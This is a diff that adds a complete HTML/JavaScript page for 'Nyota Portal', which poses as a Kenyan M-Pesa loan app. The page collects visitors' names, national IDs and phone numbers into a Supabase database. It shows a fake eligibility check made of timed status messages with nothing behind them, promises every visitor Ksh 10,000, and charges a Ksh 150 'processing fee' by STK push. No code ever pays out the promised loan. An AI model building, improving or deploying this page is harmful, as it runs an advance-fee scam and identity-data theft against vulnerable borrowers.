@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Nyota Portal | Secure Application</title>
+    <meta name="theme-color" content="#2E7D32">
+    <link rel="manifest" href="manifest.json">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: { extend: {
+                fontFamily: { sans: ['"Plus Jakarta Sans"', 'sans-serif'], roboto: ['"Roboto"', 'sans-serif'] },
+                colors: {
+                    brandGreen: '#2E7D32',
+                    brandLightGreen: '#4CAF50',
+                    brandRed: '#D32F2F',
+                    brandBlack: '#1A1A1A',
+                    playBlue: '#0056D2'
+                },
+                boxShadow: { soft: '0 10px 40px -10px rgba(0,0,0,0.08)' }
+            } }
+        }
+    </script>
+    <style>
+        .hide { display: none !important; }
+        .screen { display: none; flex-direction: column; min-height: 100vh; }
+        .screen.active { display: flex; animation: screenIn 0.35s ease-out; }
+        @keyframes screenIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+        .gradient-bg { background: linear-gradient(160deg, #121212 0%, #2E7D32 100%); }
+
+        input {
+            width: 100%;
+            padding: 1.2rem 1.1rem;
+            min-height: 56px;
+            border: 1.5px solid #E2E8F0;
+            border-radius: 14px;
+            outline: none;
+            font-size: 16px;
+            transition: all 0.2s;
+            background: #F8FAFC;
+            font-family: inherit;
+        }
+        input:focus { border-color: #2E7D32; background: #FFFFFF; box-shadow: 0 0 0 4px rgba(46, 125, 50, 0.08); }
+
+        .amount-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 700; color: #475569; background: #FFFFFF; font-size: 15px; padding: 16px 0; }
+        .amount-btn.selected { background: #2E7D32; color: white; border-color: #2E7D32; box-shadow: 0 6px 16px -4px rgba(46, 125, 50, 0.4); }
+
+        .term-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 600; color: #475569; background: #FFFFFF; font-size: 14px; padding: 16px; }
+        .term-btn.selected { background: #2E7D32; color: white; border-color: #2E7D32; }
+
+        .app-shell { background: #F7F8FA; min-height: 100vh; }
+        .native-card { background: #FFFFFF; border-radius: 22px; box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04), 0 8px 24px -8px rgba(15, 23, 42, 0.08); }
+        .native-btn { background: #2E7D32; color: #fff; border: none; border-radius: 14px; padding: 18px 24px; min-height: 56px; font-size: 16px; font-weight: 700; letter-spacing: 0.01em; width: 100%; transition: all 0.15s ease; cursor: pointer; font-family: inherit; }
+        .native-btn:active { transform: scale(0.97); background: #1B5E20; }
+        .native-btn:disabled { opacity: 0.5; }
+
+        .app-bar { display: flex; align-items: center; padding: 20px 20px 12px; gap: 12px; }
+        .app-bar-back { width: 44px; height: 44px; border-radius: 50%; background: #FFFFFF; display: flex; align-items: center; justify-content: center; box-shadow: 0 1px 3px rgba(0,0,0,0.06); border: none; cursor: pointer; }
+        .app-bar-title { font-size: 20px; font-weight: 800; color: #0F172A; letter-spacing: -0.02em; }
+        .section-label { font-size: 11px; font-weight: 700; color: #64748B; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 12px; }
+
+        .row-item { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; }
+        .row-item + .row-item { border-top: 1px solid #F1F5F9; }
+        .row-label { font-size: 14px; color: #64748B; font-weight: 500; }
+        .row-value { font-size: 15px; font-weight: 700; color: #0F172A; }
+
+        .info-banner { background: #EFF6FF; border: 1px solid #DBEAFE; border-radius: 18px; padding: 16px; display: flex; gap: 12px; align-items: flex-start; }
+
+        .pulse-ring { width: 120px; height: 120px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; position: relative; }
+        .pulse-ring::before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 2px solid rgba(255,255,255,0.25); animation: pulseRing 2s ease-out infinite; }
+        @keyframes pulseRing { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
+
+        .check-circle { width: 96px; height: 96px; background: #DCFCE7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: popIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
+
+<div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
+
+<!-- ============ APP CONTENT ============ -->
+<div id="app-content" class="font-sans">
+
+    <!-- LOGIN -->
+    <div id="screen-login" class="screen active gradient-bg" style="padding: 24px;">
+        <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
+            <div class="text-center mb-8">
+                <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6"><img src="icon-512.png" class="w-16 h-16 rounded-2xl object-cover"></div>
+                <h1 class="text-white text-3xl font-extrabold tracking-tight">Nyota Portal</h1>
+                <p class="text-green-200 text-sm font-medium mt-2 tracking-wide font-bold">Secure Application</p>
+            </div>
+            <div class="bg-white rounded-2xl p-6 shadow-xl mt-4">
+                <h2 class="text-xl font-bold text-slate-900 mb-1">Create Account</h2>
+                <p class="text-sm text-slate-500 mb-6">Enter your details to check your limit</p>
+                <div class="space-y-4">
+                    <div><input type="text" id="in-name" placeholder="Full Name"></div>
+                    <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
+                    <div><input type="tel" id="in-mpesa" placeholder="Safaricom M-Pesa (07XX or 01XX)"></div>
+                    <button onclick="submitLogin()" class="native-btn mt-4">Check Eligibility</button>
+                </div>
+                <p class="text-center text-xs text-slate-400 mt-6 font-medium"> Your data is encrypted and safe</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- CHECKING (Extended 12-Second Analysis) -->
+    <div id="screen-checking" class="screen gradient-bg items-center justify-center" style="padding: 24px;">
+        <div class="pulse-ring"><img src="icon-512.png" class="w-20 h-20 rounded-2xl object-cover z-10 relative"></div>
+        <h2 class="text-white text-2xl font-bold text-center mb-2">Checking Eligibility</h2>
+        <p id="check-status" class="text-blue-200 text-sm mb-10 font-medium text-center px-4">Connecting to secure servers...</p>
+        
+        <div class="w-full max-w-xs bg-white/10 rounded-full h-2 mb-4 overflow-hidden">
+            <div id="check-bar" class="bg-brandGreen h-2 rounded-full transition-all duration-100" style="width: 0%"></div>
+        </div>
+        <p id="check-percent" class="text-white font-bold text-lg">0%</p>
+        
+        <p class="text-blue-200/60 text-xs mt-8 text-center">Do not close this window</p>
+    </div>
+
+    <!-- LOAN SELECTION -->
+    <div id="screen-select" class="screen app-shell" style="padding: 0 0 32px 0;">
+        <div class="app-bar">
+            <div class="w-full">
+                <h1 class="app-bar-title">Hello, <span id="greeting-name">there</span></h1>
+                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <strong class="font-extrabold text-brandGreen text-sm">Ksh 10,000</strong></p>
+
+                <div class="mt-3 bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center gap-3">
+                    <div class="bg-emerald-100 p-2 rounded-full flex-shrink-0">
+                        <svg class="w-5 h-5 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    </div>
+                    <p class="text-sm text-emerald-800 font-semibold">You qualify for up to Ksh 10,000!</p>
+                </div>
+            </div>
+        </div>
+        <div style="padding: 0 20px;">
+            <div class="section-label">Select amount</div>
+            <div class="grid grid-cols-3 gap-2.5 mb-6" id="amount-grid"></div>
+
+            <div class="section-label">Repayment term</div>
+            <div class="flex gap-2.5 mb-6">
+                <button onclick="setTerm(30, this)" class="term-btn selected flex-1">30 days</button>
+                <button onclick="setTerm(60, this)" class="term-btn flex-1">60 days</button>
+                <button onclick="setTerm(90, this)" class="term-btn flex-1">90 days</button>
+            </div>
+
+            <div class="native-card" style="padding: 20px; margin-bottom: 24px;">
+                <div class="row-item"><span class="row-label">You receive</span><span id="sum-receive" style="font-size: 22px; font-weight: 800; color: #2E7D32;">Ksh 1,000</span></div>
+                <div class="row-item"><span id="sum-interest-label" class="row-label">Interest (10%)</span><span id="sum-interest" class="row-value">Ksh 100</span></div>
+                <div class="row-item"><span class="row-label">Total repayment</span><span id="sum-total" class="row-value" style="color: #D32F2F; font-size: 17px;">Ksh 1,100</span></div>
+                <div class="row-item"><span class="row-label">Due date</span><span id="sum-due" class="row-value">--</span></div>
+                <div class="row-item"><span class="row-label">Processing Fee (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #1A1A1A; font-size: 17px;">Ksh 150</span></div>
+            </div>
+            <button onclick="goToPayment()" id="btn-go-payment" class="native-btn">Proceed to Payment</button>
+        </div>
+    </div>
+
+    <!-- PAYMENT -->
+    <div id="screen-payment" class="screen app-shell" style="padding: 0 0 32px 0;">
+        <div class="app-bar">
+            <button onclick="showScreen('screen-select')" class="app-bar-back">
+                <svg class="w-5 h-5 text-slate-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
+            </button>
+            <h1 class="app-bar-title">Processing Fee</h1>
+        </div>
+        <div style="padding: 0 20px;">
+
+            <div class="native-card text-center" style="padding: 32px 20px; margin-bottom: 20px;">
+                <p class="section-label" style="margin-bottom: 8px;">Loan Amount Requested</p>
+                <p style="font-size: 52px; font-weight: 900; color: #2E7D32; letter-spacing: -0.03em; line-height: 1;" id="pay-loan-context">Ksh 1,000</p>
+
+                <div class="mt-6 pt-5 border-t border-slate-100 flex flex-col items-center">
+                    <p style="font-size: 13px; color: #64748B; font-weight: 600; margin-bottom: 4px;">One-time Processing Fee</p>
+                    <p style="font-size: 24px; font-weight: 700; color: #0F172A;" id="pay-levy">Ksh 150</p>
+                </div>
+            </div>
+
+            <div class="native-card" style="padding: 20px; margin-bottom: 20px;">
+                <label class="section-label" style="display: block;">M-Pesa number</label>
+                <input type="tel" id="pay-mpesa" placeholder="Safaricom M-Pesa (07XX or 01XX)">
+                <p style="font-size: 12px; color: #94A3B8; margin-top: 10px;">Your loan will be sent to this number</p>
+            </div>
+
+            <div class="info-banner" style="margin-bottom: 24px;">
+                <svg class="w-5 h-5 flex-shrink-0 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                <p style="font-size: 13px; line-height: 1.5; color: #2E7D32; font-weight: 500;">Pay the processing fee to activate your loan. Funds will be released immediately after confirmation.</p>
+            </div>
+
+            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 150</button>
+        </div>
+    </div>
+
+    <!-- SUCCESS/VERIFY/PENDING -->
+    <div id="screen-success" class="screen app-shell" style="padding: 0 20px 32px;">
+        <div class="max-w-sm mx-auto w-full text-center" style="padding-top: 60px;">
+            <div id="verify-anim" class="flex flex-col items-center">
+                <div style="width: 100px; height: 100px; border: 5px solid #E2E8F0; border-top-color: #2E7D32; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 28px;"></div>
+                <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Verifying payment</h2>
+                <p id="verify-subtitle" style="font-size: 14px; color: #64748B; margin-top: 8px; line-height: 1.5; padding: 0 8px;">Please wait while we confirm with M-Pesa...</p>
+                <p id="verify-time" style="color: #D32F2F; font-weight: 800; margin-top: 20px; font-size: 18px; background: #FEF2F2; padding: 6px 18px; border-radius: 999px; display: inline-block;">0s</p>
+            </div>
+
+            <div id="success-anim" class="hide flex flex-col items-center">
+                <div class="check-circle">
+                    <svg class="w-12 h-12 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+                <h2 style="font-size: 24px; font-weight: 800; color: #0F172A; margin-bottom: 8px;">Loan Approved!</h2>
+                <p style="font-size: 14px; color: #64748B; padding: 0 12px; line-height: 1.5;">Your loan request has been successfully processed.</p>
+                <div class="native-card w-full" style="margin-top: 28px; margin-bottom: 20px; padding: 20px;">
+                    <div class="row-item"><span class="row-label">Loan Amount</span><span id="suc-loan" class="row-value" style="font-size: 17px;">Ksh 1,000</span></div>
+                    <div class="row-item"><span class="row-label">Total Repayment</span><span id="suc-total" class="row-value">Ksh 1,100</span></div>
+                    <div class="row-item"><span class="row-label">Due Date</span><span id="suc-due" class="row-value">--</span></div>
+                    <div class="row-item"><span class="row-label">M-Pesa</span><span id="suc-mpesa" class="row-value" style="color: #2E7D32;"></span></div>
+                </div>
+                <div class="info-banner w-full" style="margin-bottom: 20px;">
+                    <svg class="w-5 h-5 flex-shrink-0 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <p style="font-size: 13px; line-height: 1.55; color: #2E7D32; font-weight: 500; text-align: left;">Your funds will be disbursed to your M-Pesa within the next <strong>24 hours</strong>.</p>
+                </div>
+            </div>
+
+            <div id="failed-anim" class="hide flex flex-col items-center">
+                <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
+                    <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
+                </div>
+                <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Payment Not Completed</h2>
+                <div id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 16px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</div>
+                
+                <button onclick="showScreen('screen-payment')" class="native-btn" style="margin-bottom: 12px; background: #FFFFFF; color: #475569; border: 1.5px solid #CBD5E1; display: flex; justify-content: center; align-items: center;">
+                    <span>Try Again</span>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// LIVE BACKEND CONFIGURATION
+const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
+const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
+const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
+
+const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
+const FAILED_STATUSES = ['FAILED','REJECTED','EXPIRED','DECLINED','FALSE','ABORTED','USER_ABORTED'];
+
+let state = { name:"", id:"", mpesa:"", loan:1000, levy:150, term:30, interest:100, total:1100 };
+const amounts = [1000,2000,3000,5000,7500,10000];
+let pollTimer = null, isProcessingPayment = false, toastTimeout;
+
+const format = (n) => "Ksh " + Number(n).toLocaleString();
+const getDueDate = (d) => { const x = new Date(); x.setDate(x.getDate()+d); return x.toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'}); };
+
+function showScreen(id){
+    document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0,0);
+}
+
+function showToast(msg){
+    const t = document.getElementById('android-toast');
+    t.innerText = msg; t.classList.remove('hide','hide-toast'); t.classList.add('native-toast');
+    clearTimeout(toastTimeout);
+    toastTimeout = setTimeout(()=>{ t.classList.add('hide-toast'); setTimeout(()=>t.classList.add('hide'),300); }, 4000);
+}
+
+// LOGIN & DB SAVE
+function submitLogin(){
+    const name = document.getElementById('in-name').value.trim();
+    const id = document.getElementById('in-id').value.trim();
+    const mpesa = document.getElementById('in-mpesa').value.trim();
+
+    if(!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid name.");
+    if(!/^\d{7,8}$/.test(id)) return showToast("National ID must be 7-8 digits.");
+    if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
+
+    state.name = name; state.id = id; state.mpesa = mpesa;
+
+    fetch(`${SUPABASE_URL}/rest/v1/users`, {
+        method:'POST',
+        headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
+        body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa })
+    }).catch(()=>{});
+
+    // EXTENDED 12-SECOND CHECKING ANIMATION
+    showScreen('screen-checking');
+    let p = 0;
+    
+    // 12 seconds total duration (120 intervals of 100ms)
+    const duration = 12000; 
+    const steps = duration / 100;
+    const increment = 100 / steps;
+
+    const i = setInterval(()=>{
+        p += increment;
+        if(p > 100) p = 100;
+        
+        document.getElementById('check-bar').style.width = p + "%";
+        document.getElementById('check-percent').innerText = Math.floor(p) + "%";
+
+        // Dynamic text updates based on progress
+        let msg = "Connecting to secure servers...";
+        if(p >= 15) msg = "Verifying National ID...";
+        if(p >= 35) msg = "Analyzing M-Pesa history...";
+        if(p >= 60) msg = "Checking credit score...";
+        if(p >= 80) msg = "Calculating your limit...";
+        if(p >= 95) msg = "Finalizing your dashboard...";
+        
+        document.getElementById('check-status').innerText = msg;
+
+        if(p >= 100){ 
+            clearInterval(i); 
+            buildLoanScreen(); 
+        }
+    }, 100);
+}
+
+// CALCULATOR
+function buildLoanScreen(){
+    const first = state.name.split(' ')[0];
+    document.getElementById('greeting-name').innerText = first || 'there';
+
+    state.loan = 1000;
+    const grid = document.getElementById('amount-grid');
+    grid.innerHTML = '';
+
+    amounts.forEach(a=>{
+        const b = document.createElement('button');
+        b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`;
+        b.innerText = a.toLocaleString();
+        b.onclick = ()=>{
+            document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('selected'));
+            b.classList.add('selected');
+            state.loan = a;
+            updateSummary();
+        };
+        grid.appendChild(b);
+    });
+
+    updateSummary();
+    showScreen('screen-select');
+}
+
+function setTerm(d, b){ state.term = d; document.querySelectorAll('.term-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); updateSummary(); }
+
+function updateSummary(){
+    const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
+    state.interest = Math.round(state.loan * rate);
+    state.total = state.loan + state.interest;
+    document.getElementById('sum-receive').innerText = format(state.loan);
+    document.getElementById('sum-interest-label').innerText = `Interest (${Math.round(rate*100)}%)`;
+    document.getElementById('sum-interest').innerText = format(state.interest);
+    document.getElementById('sum-total').innerText = format(state.total);
+    document.getElementById('sum-due').innerText = getDueDate(state.term);
+    document.getElementById('sum-levy').innerText = format(state.levy);
+}
+
+// PAYMENT (STK PUSH)
+function goToPayment(){
+    document.getElementById('pay-levy').innerText = format(state.levy);
+    document.getElementById('pay-mpesa').value = state.mpesa;
+    document.getElementById('pay-loan-context').innerText = format(state.loan);
+    showScreen('screen-payment');
+}
+
+async function processPayment(){
+    if(isProcessingPayment) return;
+    const mpesa = document.getElementById('pay-mpesa').value.trim();
+
+    if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number.");
+
+    isProcessingPayment = true;
+    state.mpesa = mpesa;
+    document.getElementById('btn-pay').disabled = true;
+
+    document.getElementById('verify-anim').classList.remove('hide');
+    document.getElementById('success-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.add('hide');
+    showScreen('screen-success');
+
+    try {
+        const res = await fetch(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
+            method:'POST',
+            headers:{ 'apikey': SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
+            body: JSON.stringify({
+                amount: state.levy,
+                phone: "254" + mpesa.substring(1),
+                accountReference: "NY_" + Date.now(),
+                callbackUrl: PALPLUSS_CALLBACK
+            })
+        });
+
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Payment service error');
+
+        const txnId = data.data?.transactionId || data.transactionId || data.id;
+        if (!txnId) throw new Error("No transaction ID.");
+        
+        await fetch(`${SUPABASE_URL}/rest/v1/loans`, {
+            method: 'POST',
+            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
+        });
+
+        startPolling(txnId);
+
+    } catch (err) {
+        showFailed(err.message);
+    }
+}
+
+// POLLING
+function startPolling(txnId){
+    let attempt = 0;
+    const doPoll = async ()=>{
+        attempt++;
+        document.getElementById('verify-time').innerText = attempt + "s";
+        if(attempt >= 60){ showFailed("Timeout. Please check your M-Pesa messages."); return; }
+
+        try {
+            const res = await fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`, {
+                headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}` }
+            });
+            const rows = await res.json();
+            if(rows.length > 0){
+                const s = String(rows[0].status).toUpperCase();
+                if(SUCCESS_STATUSES.includes(s)) { showSuccess(); return; }
+                if(FAILED_STATUSES.includes(s)) { showFailed("Payment was cancelled or failed."); return; }
+            }
+        } catch(e){}
+
+        pollTimer = setTimeout(doPoll, 2000);
+    };
+    doPoll();
+}
+
+function showSuccess(){
+    clearTimeout(pollTimer); isProcessingPayment = false;
+    document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('success-anim').classList.remove('hide');
+    document.getElementById('suc-loan').innerText = format(state.loan);
+    document.getElementById('suc-total').innerText = format(state.total);
+    document.getElementById('suc-due').innerText = getDueDate(state.term);
+    document.getElementById('suc-mpesa').innerText = state.mpesa;
+}
+
+function showFailed(reason){
+    clearTimeout(pollTimer); isProcessingPayment = false;
+    document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.remove('hide');
+    document.getElementById('failed-reason').innerText = reason;
+    document.getElementById('btn-pay').disabled = false;
+}
+</script>
+</body>
+</html>
